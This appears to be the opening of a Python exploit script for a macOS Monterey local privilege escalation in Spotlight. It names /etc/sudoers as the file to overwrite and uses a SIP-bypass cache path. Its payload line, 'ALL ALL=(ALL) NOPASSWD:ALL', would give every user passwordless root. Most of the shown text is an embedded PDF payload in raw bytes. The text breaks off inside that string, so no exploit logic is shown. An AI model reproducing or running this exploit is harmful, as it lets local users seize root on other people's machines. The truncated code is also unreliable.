#!/usr/bin/python

################################################################################
#      Batsignal.py - OS X Monterey Local Privilege Escalation in Spotlight    #
#                    By Gergely Kalman (gergelykalman.com)                     #
################################################################################

from __future__ import print_function
import subprocess
import shutil
import time
import os
import sys
import re

SIGNATURE = '''
#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@o@@@@@@QE@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
#@@@@@@@@@@@@@@@@@@Qbj/;;B@@@@@@@@@@,+S\=(w,;@@@@@@@@@@a`.,^/od@@@@@@@@@@@@@@@@@
#@@@@@@@@@@@@@@Bo+'     b@@@@@@@@@@Q        `@@@@@@@@@@@i       '|wQ@@@@@@@@@@@@
#@@@@@@@@@@@Ni'        `@@@@@@@@@@@d         B@@@@@@@@@@}           :a@@@@@@@@@@
#@@@@@@@@@6,            /@@@@@@@@@@u         e@@@@@@@@@d`             `lQ@@@@@@@
#@@@@@@@Q:               :aQ@@@@@@@*         \@@@@@@@O*                 `p@@@@@@
#@@@@@@O`                   `~;;;:'           ,;++;,                      j@@@@@
#@@@@@@`                                                                   Q@@@@
#@@@@@w                                                                    y@@@@
#@@@@@O                                                                    w@@@@
#@@@@@@:                                                                  '@@@@@
#@@@@@@@r            ,wQQNe+`                        .iOQQBo,            ,Q@@@@@
#@@@@@@@@E,         .@@@@@@@Qv`   ''          .'   `F@@@@@@@@~         `(@@@@@@@
#@@@@@@@@@@q^       ^@@@@@@@@@Q;`#@@@y`    `vQ@@B`_Q@@@@@@@@@o       ,F@@@@@@@@@
#@@@@@@@@@@@@@h*.   .@@@@@@@@@@@B@@@@@Q,  'Q@@@@@D@@@@@@@@@@@\   `;yQ@@@@@@@@@@@
#@@@@@@@@@@@@@@@@#a|~j@@@@@@@@@@@@@@@@@Q.`Q@@@@@@@@@@@@@@@@@B^iw#@@@@@@@@@@@@@@@
#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@aa@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@Q@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
#@@@@@@@@@@@@@@@@@@@@@@@@@@@@ The Dark Knight Appears @@@@@@@@@@@@@@@@@@@@@@@@@@
#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@'''

# In case you lost it, the default Monterey sudoers:
sudoers_backup_monterey = '''
Defaults	env_reset
Defaults	env_keep += "BLOCKSIZE"
Defaults	env_keep += "COLORFGBG COLORTERM"
Defaults	env_keep += "__CF_USER_TEXT_ENCODING"
Defaults	env_keep += "CHARSET LANG LANGUAGE LC_ALL LC_COLLATE LC_CTYPE"
Defaults	env_keep += "LC_MESSAGES LC_MONETARY LC_NUMERIC LC_TIME"
Defaults	env_keep += "LINES COLUMNS"
Defaults	env_keep += "LSCOLORS"
Defaults	env_keep += "SSH_AUTH_SOCK"
Defaults	env_keep += "TZ"
Defaults	env_keep += "DISPLAY XAUTHORIZATION XAUTHORITY"
Defaults	env_keep += "EDITOR VISUAL"
Defaults	env_keep += "HOME MAIL"
Defaults	lecture_file = "/etc/sudo_lecture"
root		ALL = (ALL) ALL
%admin		ALL = (ALL) ALL
'''
###

# GLOBALS
BASEDIR = "./exploit"

# our payload to overwrite the file with:
#   this actually comes from our payload file, but we are looking to find this
#   string in the spotlight cache
PAYLOADFILE = "payload.pdf"
MAGIC = b'ALL ALL=(ALL) NOPASSWD:ALL'

# our target file to overwrite
TARGET = "/etc/sudoers"
# NOTE: make sure this is a directory if a directory is expected!
SIP_BYPASS_PATH = "/Library/Caches/com.apple.spotlight/x"
# the payload is just a PDF that contains MAGIC as text, made with libreoffice
PAYLOAD = '%PDF-1.6\n%\xc3\xa4\xc3\xbc\xc3\xb6\xc3\x9f\n2 0 obj\n<</Length 3 0 R/Filter/FlateDecode>>\nstream\nx\x9ce\x8c=\x0b\xc20\x10\x86\xf7\xfb\x157\x0b\x89wI\xd3$\x10\x0e\xac\x1f\x83[!\xe0 nV7\xc1.\xfe}\xaf-\x0e*\x07\xcf\xc1\xfbE\x96\xf1\x05O$$K.a\xcblsd\x8cy\xf9\xe3\x00\xa7\x15>\x96\x84\xdex\x87\xaeBhm\xc2\xe8\x1a-\xd7+\xae\x0f\x8c\xec\xb0\xde\xce\x85X\x8c+\xe4d\x86\x0f\x85\xbc\x04\xfa\x91\x15\x8d\x18_(H\xfa\xb7Z1\xaaz\x8a\xa2\xed4\x9bYR\x9e\x82*l\xc4\xf0\x87\x9d(\xb6sb75\xbf\x96.\xf5\x08\xfb\n=\xf4\xf8\x06|\xa40g\nendstream\nendobj\n\n3 0 obj\n149\nendobj\n\n5 0 obj\n<</Length 6 0 R/Filter/FlateDecode/Length1 10024>>\nstream\nx\x9c\xe58mt\x1b\xd5\x95\xef\xce\xe8\xd3_\xd2\xd8\xb2\xfc!\x1a\x8d3\xb1\x93\xe0\x0f\xd9V\x1cb\x88\xb1\xfc!\xd9\x89\rvb;H\t\x89%\xeb\xc3\x12\xd8\x92b\xc9\x0e\x81\x85xK\x03\xa9CJJ\xbb)\x04v\xa1\x1c`)\x9b\x9e\x8cI`M\x97\x12\xb3\x05\n\xa7\xdb\x02[\xe8\xb6@\xc0{\n\xf4p\x96@\x96\xa6\x94\x92D\xde\xfb\x9e\xc6\x8e\x12\x02\x9c\xee\xd9\x7f\xfb\xa47s\xbf\xef}\xf7\xde\xf7f\xa4\xe4\xd8x\x90\xe4\x90I\xc2\x13\x87\x7f\xd4\x17\xb7\x95\x98\xf3\t!\xffF\x08\xe4\xfb\'\x92bSO\xe1\x15\x08\xcf\x11\xc2\xfd{(><z\xf0\x9f\xaf=E\x88\xea(!\xda\xa3\xc3#;C\xe6O]^Br\xc2\x84d\xbd\x18\x0e\xfa\x02\xcduPCHQ-\xdaX\x1dFB\x7fj\xa7\x16q\xe4\x93e\xe1\xd1\xe4\r\xb7j\xff\xa5\x11\xf1;\x10_3\x12\xf3\xfbN\t\x97\x1a\x11\x7f\x0e\xf1%\xa3\xbe\x1b\xe2\x15\xaa6\x0e\xf1w\x11\x17\xa3\xbe\xd1\xe0g\x07\x7f\x16 \xa4XEHv"\x1eK$\x03d\xcf<!\xd2\r\x94\x1f\x1f\x0b\xc6\xbb\x0f\x0e=\x8f\xf8\xdd\x84\xf0\xfb\x91\x06\xf8\xa1#\x07A\r\xc59^\xa5\xd6hu\xfa\xac\xec\x9c\\\xf2\xffp\xa8\xf7\x91B\xd2\xa9n"\x06\x12g\xd7\xf3\x06\x7f\x88\x94\x90{\x08\x99\xff\x90b\xe7\xae\xa9\xee\xf9\xcf\xff/\xa3\xd0\xa5ow\x93G\xc8Q\xb2\x8f\xfc\x8elU\x18.\xd2K"d\x1c)\x99\xe3Y\xf2*R\xe9\xe8%\x9b\xc9cd\xeaK\xcc\x1e"3\xc8O\xcby\xc9\x9dt%\x17\x1d\xbd\xe4\x07\xe4\x08\xf9\xf9y^z\xc9(\xb9\tcy\x82\xfc\x0e\xea\xc8K\xd8*1\xf2\t\xe8\xc8\xdf\x92\xe7\xd1\xea\'H\xbb\xeab\xa6\xb8<\xbc\x84\x18\x18\xca\xa0\xbeI\xee\xe5\xf6\x92\xf5\x1c\xed\xdb{(\x87\xb3qF\xf2\x1c\xb9\x0f\xb6\xa1\xe5$\xaes\xdf\xe2\x8a\xd7~\xc1\xe8\xed\xe4f\xbc\xf6\x910\x99@\x98\ru\xd3\x997\x88~\xfe\x8f\xb8\xaa\x9b\xc9z\xf2M\xd2BF24\x9e\x86\xfb\xf9,\xac_?\xb9\x1fs\xfa,\xa3\xd9\x16\x98\xdaN\xfe:\xeeI\x8e;\xfb=D\xbeK\x86q\xfa\x00\xd7\xce\xed\xe3[\xbe$C\x7f\xf5\xe0\x07H.\xac\xe4\xcb\x89\xfeb\\n\x151\xa4>\xe7\xea\xe7O\xf1\xcbH\x16\x19\x98?\xb9@\x9b\xef\x9a\xff#\xefKEU\x83\xaaK\xd4M\xaa_|\x95\x0f\xcdwU\xa3\xa8M\xe6\xdfK\xdd\x94\n\xa8\xafV?\x82\xd5z\x94\x10G\xc7\x96\xcd\x1e\xf7@\x7f\xdf\xc6\r\xbd=W_\xd5\xdd\xb5~]g\x87\xcb\xd9\xde\xd6\xda\xe2h\xbe\xb2i\xed\x15\x977\xae\xb9luC]\xad\xad\xa6\xbaj\xc5\xf2\x8a\xf2e\xd2\xd22k\xb1I0\x1a\xf2r\xb3\xb3\xf4:\xadF\xad\xe29 U\xa2\x0c^\xa7\xcc\x97\x8b\x82\xcb\'9%_gu\x95\xe8,\x0e\xb7WW9%\x97W\x16}\xa2\x8c7U\x85\xd4\xd9\xc9H\x92O\x16\xbd\xa2\\\x817_\x06\xd9+;P2t\x81\xa4#-\xe9X\x94\x04\xa3\xb8\x96\xac\xa5.$Q\xfee\xbb$\xce\xc0\xe6\rn\x84\xf7\xb5K\x1eQ>\xc1\xe0\xab\x18\xac\xaa`H."ee\xa8\xc1\xa2\xa2\xd1\x8aN\xd95\x11\x9erz1F\x98\xce\xcej\x93\xda\x82Y\xd5Ud:+\x1b\xc1l\x84\xe4\x15R|\x1aV\\\t\x0c\xe0V8/\x9f\xe6\x88.\x97\xba\xc5\x95:}\x01\xb9w\x83\xdb\xd9n)+\xf3TW\xad\x93\xf3\xa4v\xc6"m\xcc\xa4\xaci\x93\xb5\xcc\xa4\x18\xa1\xa1\x93\xbd\xe2t\xd5\xec\xd4\x1d3F2\xe4\xad\xcc\tH\x01\xdf\xb5n\x99\xf7\xa1\xee\x14\xef\x9c\x9a\xba]\x16*\xe5\x95R\xbb\xbc\xf2\xc6w\x8bq\xe5A\xb9Jjw\xca\x95\xd4j\xd7\xc6E?]\xe7\\\x82\xac.7J\xe2\xd4\x9f\x08.G:\xf1\xe1\xf9\x14\x9fB\xd1\x94\x1b\xffD((sm2lt\x97\xd1aqa\xae\xa7\xa6\\\x92\xe8\x9a\xf2N\xf9f\xe6\'\x87$\xd1(MM\xe7\xe4L\xc5\x9d\x98n\xd2\xebF\x133\xf3?\xd9k\x91]wxd\xa37\x0c\x97{\x94\xa5\xbb6v\xc9\x05\x1b\xb6\xb8e\xae\xdc%\x86}H\xc1o\xb3T\xb6\xc6R&,\xca\xf4~\x19\x9b`Z09\x98\xe1\xb22\x9a\x86\xbd3\x0e2\x84\x88<\xb9\xc1\x9d\xc6E2dy\x9c8l\x95\x1e\x99\xf3R\xce\xec\x02\xa7p\x80r&\x178\x8b\xea^\tk\xdb\xd5\xe7\x9e\x92U\xe5\xeb\x02\x92\x133\xbe\xd7\'O\x0eaw]G\x0b#\x19\xe5\xbcO-e\xd2T\xbe 6\xda<LV\xc4\xa8\xd6\x05"\xa2\xac\xae\xc0$\xa1V\xa6\x02\xf6\rU\x9922$\xef\xd3\xf4\xed\x84\x05\x1dT\x08\xf9b\xa3\x84f\xa8\x1d\xa7\xe4\xf4*\xdf\x89p1\x1a\x101\xd1\x9d\x95\xe9F\xe8w\xcb\x8ev\x04\x1c>\xa5b\xce\xe9Z\x1bj\xf8\xbcX\xb0H;+\xa6l\x93\xe2\xb2Ij]\xac.\r\xcb\x19\xe9s3\x15EM6\xb5\xc9\xc4\xebW\xb4d\x9b\x93\xed+\xd19\xe5mO\x87@mI\x1b\xdcO\x11\xfb\xfc\xdc\xf4*\xd1r\xc4NV\x11O;\x156\xb7a\x97U8\xa7\xdc\x81\x90l\xf5Z\x02\xb8\xefB\xa2\xdbR&;<Xa\x8f\xe4\x0ezh\xdba\x86V\xceYXsxX\xaf\xf4\xbb\xbb\xfa\xa4\xae\r\x9b\xddk\x94@\xd2\x0cjNU\xee\xbc\xc0\x8c\xe4\xb6\xa4\xcd`\x03\xca\xbar\x9d\xe8\xe6,\xbc\x07\x05\x8dH\x10]\x08H\xadk\xf1*k\xcbu8\x8d\x98pF\xa5\x8d\xdb\xbaVt\x83\x85,Hc\x18\xf2J\xd1\x19lW\xe4(~\x9eQ5m\xa7\xb6\xce\x05k\x1a\x8a\xa2\x9d\xb6NK\x99\xa7,=\xaa\xab8d\x8b\x8ac\xd4\xd0\xd1\xa4v.\xb0\xf0\x98B\x86\x0e\xfb\xb3\xad\x93\x91h.\x8bi\xd3\x8bn)(y\xa4\xb0(;z\xddtm4=,\xcbJ2X\xce\x95Z\xf5\x9f\x87e$\x0b\xd3D\xca\x90\xbd\x80\xd0d\xca\xaeJKfr\xe5\x0e\x86/\xa2\x9d\x17\xb0\xd7-\xb0\xc5)\x9d\xd4\xd57E\x8dK\x8aA\x82\x91\xaf\x93\tma\xc7\x1a\xc1\xc2\xce\x02\xba\xa1%<{E#ni\xb6\xa1\xa7\xa6\x1d\x0e\xba\x99\xc3\x97S#\xd2\xba\xc0\x94\xd4\xe7^\xcb\xa4\xf1<\xb9\xd9r#\xf5\x95O\xba\xa0\xab\xbf\xb5\xba\n\x8f\xb6\xd6i\t\xf6l\x98v\xc0\x9e\xbe\xcd\xee\xa7\x8c\xf8^\xb8\xa7\xdf\xfd8\x07\\\x9b\xb7\xd53\xbd\x0cy\xee\xa7D|h0*G\xa9\x94H\x11\x91"\xd4\xd2FDtL\xde\xf2\x94\x83\x90I\xc6U1\x02\xc3\xfd3@\x18M\xb7@\x03\xe2\x9f\xe1\xd24c\xdaQ\x05s\xe4 \x1crTi\x8ecAZ\x854]\x9a6\xc9hlL\x13\x9a2G\x96\xda\xa1s\xe8\x1d9\\.g\x99\x06Jz\x1c)?\xc1\xf7X=\x90#9\x90\x0b\x96i\xd4\xda\xc8\xc8309\xadwX\xd2\x12\x93(\xe1HG\xb8g\xe0\x9c\xeb\x81\xcd\xee#9\xf8t\xb6\xb0+:j\xa5\x03\xdb\xa58\x8c\xc5\xc6\xc7\x8aS\x0c\xd0F\xf9\x1bOx\xca\xeb\xa1\x9b\x8d\x98\xb14\xf8\x05\x19\xa4+\xb1L\xd2\x95\x18\x88&G\xce\x92\x82\xadr\xb6\xd4J\xe9\xcd\x94\xde\x9c\xa6k(]\x8b-\nf@\xf5I\xac}\xaf\x0c\xb4\x03\xb6\xb8\xcbpK\x8a\xa5/Y\xa6\x8c\'h\xa5<x\xa8L\x19\xdf\xab\xc6\xe0L\xf8V3\xa3\xee\xc4w\xd0|\x18t|"\xe4\x19\x0c\xaa\xfc\\cN\x8eVkT\xf1\x05\xa6\xdc<!\xcf\xeb\xc9\x17\x040\xe2\xf39G\xab2\x80a\xd0\x93\x05\xf9\xa7L\xf0\xae\t^3\xc1s&8j\x82\x87L\xf0}\x13|\xcb\x04I\x13\x04L\xd0o\x82v\x13\xac2\xc12\x13\x98L\xa02\xc1_+\xdf\xf8\x15\n\x99\xd2*&3k\x02N6\xc1\x03&\xd8o\x82I\x13\xc4M\xd0k\x02\x87\tjM \x9a\xc0h\x829&t\x81@\x8f\t\xb6*c\xfb\xe2\x18\xdc\xbe}\xec\xbc\xb1m\xeb\x05c\xfb\x05\x834\xdb+\x05b\xb7\xdb\x8b\x9b\xed\xf6\xfcF\x9b\xbd\x92\xd4\xd8\x85|(j\x14\xf0\xd6H\xaf\x8d\x8du\xb5\xe5\x85e\r\x97\x81\x1d\x8a\xe8\x9d/\xe3\x81/\x83_\xa6:\xee\x86\x97\x9e\x817\x1f;\xfb\xd2\xd1\xddgO\xde\x0e{\xdf\x87_744XT\x9f\x9d\xd6Y\xf0\x0e\xb7\xa6nV\x85\xcf\x8e\xd3\x97/ \xf8\xbbO\x15\xa6\xbf\x19`\x8d\xe3\rN\x9b\x9d-\x18!\'/g\xd0\x93\xc7\xeb\xb3\x07=D\x0by\xbcV\xab\xd7\xf3^\x8f>\xff\xa8\x00\x0f\t\xf0}\x01\xbe%@R\x80\x90\x00\x9b\x04p\tP!\x80Y\x00\x8d\x00\xa7\x04x_\x80\xd7\x04xA\x80\'\x05xD\x80\t&\xd6\xbf \xf6\x1b\x01\x9e\x13 \xd3\xce\xa2@\xbb\x00\xf5\x02\x80(\x80I\x00"`\xc1\x04x\x97\x19C\xc1\x80\x00\xab\x16\x18\xdcI\x01\xe6\x04xE\x80Y\x01\xe2\x028\x04\xa8\x15\xa8\x9e1\x83.\x0b\xf0\x00\xe3\xf62\x81/dz0\xb3\x18\x83\x17\xafEF\xc9H3-H\xb1mp\xdb\xd6JR\xcc\x10\xacG\xa3\xd0h\xaf\xab\x05\xadPV\x7fY\x81\x9d\xc7*\x08\xcb\x1b\xca\xb8\x1d/\x83\xee\xf5\xc0\x95-\xf9\xa7\xdf;t\x88[\xab\xd6\x95\x9e\x0e\x9b\xa0(\xb5\x0b\x8b\xf0\x0f\xa5\r\xf4\xd5\x99\x84\xe0Q\x95\x95\x7f\x14\x7f\x91k\x89\xc3\xb1L\xc3\xa9\x91\xa8\xd3\xf3\xdc\x8f=\x84\x07\x81\xe7\xb5\x0e\xad\xe6\xc7\x1e\xab\x16\x0cZ\xd0:r\x8c\x9dZb\xab\xdc\xba\xbd\x92\x94\x16\x1b\x7fE\xc3\xa0\xfei\'\xd0\x08\xb0\x01\xe8TY\xcft\xf0O\x9d\xe9\xe0\xf2B!8\x18\na}7\xa7\xba\xb90\xfe>\x14\xc8%\x8e\x1c\xa2\xcfS\xe9U\xf9\x05\xb9Dm!\xcd\xcd\x99\x16\x8c\xf9\xe6\xa2\xc2\x1a\xe0\x1aV\xe5\xaf\xbe\xac0\x0f8\xb0\xb8\x0el\x7f\xe1\x9dH\xf8\xed\x17o\xdc\xdf\x06\x1f\xa5\xce\xa4~\xf1ZK\x7f\xe4/\xb0\xe1\xe3\x8f\xa0\xe7\xb3\xeb\xfa]o\xa6\xdeb=\xd4\x8a>z\x17|\xe8\x89:\x8f\xe4\xe5\x17\xe0+\xfd\x05>\n\x1a\xae\x84|\xc1\xc8U,oX\x02\xf9\x85&N\xd3\xba\xfd\x80\xabm\xff\x8d/\xbe\x1d\x0e\xbf\x9d\xea\xeeoy\x1d\x1a\x80\x07\r,{\xd3\xd5\x7f\xfd\x9fS\xd3\x1f}\x94:\xfc\xd9b\x9f\xaa\xef\xc6>- \xd78j\x0b\xb4\x9a|\xbd>O\x93WhR\x13\x83\x80\x07\x88\x8e\x13x}^N\xde\xa0\xa7@\x9b\x93O\n\xa1\xd9Q\x08b!\xcc\x15\xc2\x03\x85X\xfd\xedXg\xdcUl[\x15+w\xfbbl\x82\x9d\xa6\x00KW\xa8\x15$\x10\xd8~\xa2\x95\x04\xd5\xadG\xe1\xa5C\xbe3\xcf\x1fM]v\xe8\x10\x1c\xe0\x1eW}T\xda\xd0Pz:_\xf5\xe4\xe9\x83t7\xd1\x82\x9e\xb1\xb2\x9fC\xa4\x7f\xfeCuB\xddM\xb2\x89\x99\xacv,!9\x1a!G(*6\xf1\x83\x1eSA\x9e\x1e\xf7\x94\x8a\x14cd\xc5 \x16\xc3\xf6\xed4\xa2t3\x9dW\x07{=M\x92\xb4\x94\xe3\x8de"\x11\x8c\x04\xafP\xfe\xdb\xf7\xdf{\xe3w\xef\xff\xe1?^\xe5\xee\x84v\xe8N\xc9\xa9\xd9\xd4\xb3)\x99{ \xf5\xd3\xd4\xdb\xb0\x14\xda\xa0\x05,\xa9\xf7R\xc7\xb8C\xa9\x87S\x87S\x8f\xa5\x1e\x84\xad\x18\x13\xdd\xdfe\x987\x1d)&\xb3\x8eIR\xa8\xce\xca2\x14\x1aJK\xf4\x1a\xdc\xd1\xfa\xdc\xfc|\xdc\xd9\xf9\xc6AO>\x9fe\xc8\xc5L\xe6\xe6\xdfY\n\xbbJ!V\n\xb6R0\x94\xc2;\xa5p\xac\x14\xeeg\x94\x9eRhf\xf4yF\x7f\x99\x11\x07\x99\xd8\x9a\xb4\xdc1\xa6\x9c\xd6<\xcc\xd4v1\x1d+\xa3\xe8\xb6\x9d\xdbd\x8b\xe7`\xe6nS\xf6Ys%&\x854\x16\xdb*3j\x84\xd9YUQ\t\x82\xbd~\xb5\xfa\\\x8dD\xc1\xa4\x91\xf8\xcd\x07\x9f\x1c\n\xff\xe8\x87\xa9\xab_?\xfb\x8b\xfb\x0f\xc1\xe7\xf0\xe1_>\xe0\xe5\x87\xbfsv\xf7\xc1S\xa9\xd6\x85B\xa5\xc6\x7f\xf5\x1b\xec\xa5o\xcf\x7f\xc8\x9f\xc2:U\x13\x8fcU\x91n\xf9\x12",\x17l5Kt\xa6K/U\x0fz\xe0\xd2\x02\x93e\xd0SlR\x9d\xb4\xc1\x9c\r^\xb1\xc1\xac\rN\xb2k\xad\rD\x1b;M\xb6\xb3h\xed\xb4\x80v\x16l\xa3\x12j\xba\x9b\n\xecEK\x00#mXU\xa3iX\xb5\xda^_$H\xcb+\xa4\xa5\x9aB\xd3\x12\x9c\x1aii\xc5\xf2\xbd-R\xf9\x13\xee;\xfe\xbe\xc9\x7f\xcb\xee[\xfcM\'_\x7f\xf0\x99\x16)t\xe0\xb6\x1f4\xf9w\xed\xde\xe5o\xfahn\xe4\x8d\x01\x88<a\xeb\xbc\xf3\x96\xcem-\xd55k6\xed\xda\xfa\xc0\x93\x95\xa9\x0f\x1eZ?\xeam\xd9\xd4Te\xbbb\xcb\xad\xde\x7f}\xbd\xa2\x8c\xed\x11n\xfe?\xb5\xdf\xc6Z\xe3s\xc8!\x1aLYj\x93\xda\\\xc8\xe9\xb2r;\xb9\x9c\x9c\xdc\\\x93!K\xad\xc5\xf5\tZ>/;{f\xfe3\xc7s\xc8\xca\xe6\x81\xa8\n\x02f\xd8d\x06\xb3\x194f\xf8\xc0\x0co\x9a\xe1\x053<b\x86\x03f\x081\x96\xcb\x0c\xab\xcdP\xc1\x04"\x9f\x9a\xe1}3\xfc\xc6\x0cO\x99\xe1\x9bf\x80\xb8\x19\xd0\xc0\xbbfx\xcd\x0c\xffd\x86{\xcd\xb0\xd7\xac\x10\xfb\xcd\xe00\xc3*3,3\x83\x89\t<g\x86\xa3fx\x88\xc9\xf42.Wk\x06b\x86\xc6\x93fx\xd9\x0c\xc7\xcc\xb0\xdf\x0cFFz\xc5\x0c\xb3f\x90\x991\xa4\xccePz\xcc`3\x83\xd5\x0c\x99\xe7\xf6\xe2\x91>\xf8\xc5\xd3\x1c\x99\x83_x\xfc*O[;=\x11\xec\x0bO]<\xe7\xed6{\xe6\xb6TKz\x90\xd2\x07\x84\x1e\xec\xfa4\xa4\xde\xd6\x90z(uoC\xaa}\x9c#\xcfC3D\xaa\xe1Z\xa8}\x15\x9e\x1e\xb7\xf2\xf7\x9d\t\xa8s\xe9Qq\xa6\x87\x7f\xf0\xcc6~\x9a\xc2t?\xce\x9fQ\x8fc\x8d\xf4\xa4\x88t;lj\x13\xc95\xe5\x16\x97\x14\x15\x0ez\x8aT^O\x11o4\rz\x8cZ\xaf\xc7\x98OJ\xf0\xac(\x01\xb1\x04\xe6J\xe0\x81\x12\x88\x97\xc0\xd6\x85\x93\xac\x92\x1d\x1c\xe7\x9f\x1c\xa4L\x12\xccxz@\xfa\xd4(\x97\xd8\x06Q=\x94z5\xf5\x87\xa37<\xfc\xe9\x07g?\x83\x04\x84R\xff\x98\xfaQj\xe9!|2=\n%\xb0\xf4\xf4M:X\xca?\x9fz"u\x14\x0f\x95GT\x19\xcf\xa8\x07\xe7\x7f\x0f\xdf\xe3\x9f\xc5\xf3\xac\x88\xc8\x8e\x9d9\x84\xe4k4\xc5%\x85\x86{\xb7\x14\x1ay\xfd\xbd[\xf8\x82\xd7J\xe0\xb9\x128Z\x02\x0f\x95\xc0\xb7J Y\x02\x81\x12\xc0\xa0kK`Y\t\x98J@U\x82\x0fr&4\xb9\xc0\xee/\x81\xf6\x12x%C\x13\x97\xc8\x19K\x00\x17|\x92\xadt?[\xac\xb7\x04z\x99\xb1\xc5Z\rf>\x96\xcf{\x8b\xca8I\xd9\x0e\xc4\x97#\xb6\xc7\xd8\xd63\x0b\x190|\xcfi_\xe5t\xd9\xeb]\xaez\xbb\xcb\xb9\xca\xee\xbc\xb6\xae\xb3\xb3\x0eAn\xc6\xeer\xd9\x11!\xec\xffe\xae\xe4\x9e\xbd\xd7\x05\x8b\x06\rk\xffD\xac\xe9\xff6_l\x7f\xe5W\xe7\xfe\xb9Ju\xe3n\xa3\xff\xf8\xe90W\xe9\x81z\xda\xb2\x94\x93\\\xb3(\x04\x17\xfc\xdd\x95\xa7i\xc4\'\xd9\xcf\x89I\xf5{r\x05US\xddJB\xdccd3\xceV\xa4_\x81\xb3_\x95 W\xe0\xfc\xb6v\x1f\xe1(\x8dk$\x0f2\xed\xdf\xc2\xf7\xf1\xf3"|\xceUq\xb7p/\xf2\x1b\xf9gT\xfbU\xef\xab\x03\x8a\xa7<R\xa3\xc4\xc2\x11#\xb1\x91k\x11\xf8\x19\xff\x02\xbeeP\xee\x12\x88.\xc6\xb3i16@\xc9M\n\xcc\xe1\xdbHH\x81y|~\x8f*\xb0\ne\xf6(\xb0\x9a\xe4\x92\xbb\x15X\x83\xef\xf9\x0f+\xb0\x96\xdcH\x8e*\xb0\x0e\xcf\xa0\x1a\x05\xd6\x93<hU\xe0,\x88B\xaf\x02g\x93K\xb8g\x16\xff\xc9\xaf\xe1\xdeP\xe0\\\xd2\xc0\xeb\x148\x8f\x94\xf2M4z\x15\xfd\x07\xf2\x10\x7f\x8d\x02\x03\x11U\xbc\x02s$O%)0OV\xab\xea\x14X\x852\xc3\n\xac&\xa5\xaa\xdb\x15XC\x96\xa8~\xa8\xc0ZrJuL\x81ud\x85\xfa\x88\x02\xeb\xc9%\xea7\x158\x8b{K\xfdg\x05\xce&kt\xbfV\xe0\x1cr\xad>[\x81s\xc9u\xfa\x05_yd\x95\xfe\xd5\xf6\xc8p$\x19\xb91\x18\x10\x03\xbe\xa4O\xf4\xc7\xe2;\xc7"\xc3\xe1\xa4\xb8\xc2\xbfR\xac\xaf\xad\xab\x15;b\xb1\xe1\x91\xa0\xd8\x16\x1b\x8b\xc7\xc6|\xc9H,Z\x93\xd5v\xa1X\xbd\xb8\x11Mt\xfa\x92U\xe2\xba\xa8\xbf\xa6;2\x14L\xcb\x8a}\xc1\xb1Hhcpx|\xc47\xd6\x92\xf0\x07\xa3\x81\xe0\x98X-^(q!\xbe)8\x96\xa0H}M]\x8d\xfd\x1c\xf3B\xd9HB\xf4\x89\xc91_ 8\xea\x1b\xbb^\x8c\x85\xce\x8fC\x1c\x0b\x0eG\x12\xc9\xe0\x18\x12#Qq\xa0\xa6\xafF\xec\xf5%\x83\xd1\xa4\xe8\x8b\x06\xc4\xfeE\xc5\x9eP(\xe2\x0f2\xa2?8\x96\xf4\xa1p,\x19\xc6H\xaf\x1b\x1f\x8b$\x02\x11?\xf5\x96\xa8Y\\@F6\xfa\x92\xc1\x89\xa0x\x95/\x99\x0c&b\xd1V_\x02}ad\xfd\x91h,Q%\xee\x08G\xfcaq\x87/!\x06\x82\x89\xc8p\x14\x99C;\xc5\xf3uD\xe4\xfap-\xd1hl\x02MN\x04\xab0\xee\xd0X0\x11\x8eD\x87\xc5\x04]\xb2\xa2-&\xc3\xbe$]\xf4h09\x16\xf1\xfbFFvb\xc9F\xe3\xa85\x845\xda\x11I\x86\xd1\xf1h0!^\x1d\xdc!n\x8c\x8d\xfa\xa2\x8f\xd5\xa4C\xc1\xdc\x840\xa7bd4>\x16\x9b`1V\'\xfcc\xc1`\x14\x9d\xf9\x02\xbe\xa1\xc8H$\x89\xd6\xc2\xbe1\x9f\x1f3\x86i\x8b\xf8\x13,#\x98\x081\xee\x8bV;\xc7\xc7b\xf1 FzMG\xf79A\x0c0\x9d\xcdDld\x02=S\xe9h0\x18\xa0\x1e1\xec\x89\xe0\x08*\xa1\xe3\x91X\xecz\xba\x9ePl\x0c\x03\r$\xc3\xd5\x19\x91\x87b\xd1$\xaa\xc6D_ \x80\x0b\xc7l\xc5\xfc\xe3\xa3\xb4N\x98\xe6\xe4Bp>\xffX\x0cy\xf1\x11_\x12\xad\x8c&j\xc2\xc9d\xfcr\x9bm\xc7\x8e\x1d5>\xa54~\xacL\rZ\xb6}\x15/\xb93\x1eT\xea1F\xad\x8c\x8etc\xf9\xa3\xb4t\xe3\xac\xbet\x11}\xeb\xba\xc5\x9e8\xe6\xc7\x85\xc1\x89\x8a@\x95\xb8\xd0\x99u5u\x8a\x0bLc$\x9eL\xd4$"#5\xb1\xb1a[\x8f\xab\x9b\xb4\x93\x08\x19\xc6\x99\xc4y#\t\x92\x00\x11q\xfa\x10\xf7!\xe4\'1\x12\';\xc9\x18\x93\n#U$+\x90\xba\x12\xef\xf5\xa4\x96\xd4\xe1\x14I\x07J\xc5\x90?\x82\xfa"iCx\x0c\xb5\xe8\xd5\xc7\xec\xc6H\x14\x8f\xd1,\xc6\xf9jk\xf5\x08mT\xa2\xe8d\xdaU\x08\xadC}?Z\xe8F\xbd!\xe4f\xda\x15I\x1f\xa3D\xf0\x98\xa5\x9a\xc3d\x1c\xe3\xf0!\xa5\x85$P+\x882\x01&!\xe2\xeb\xa9\xf8\xb56\xbe\x8e\xbf\x89A\x89EN=\xc6U\x87\xd3~Q\xcd\xaf\xb3\x1bAK"\xcbt\x92qh\xa4\xa3,\xfa\xeb\x91\x16C\xbd\xaf\xca\x87\x88rAV\xbd\x04r\x82\x0c\x0b0\xab\xd4\xf6\x00J\xf41\xa9^\xa6I3\x91d\xde\xa2L\xaa\xff"\x1e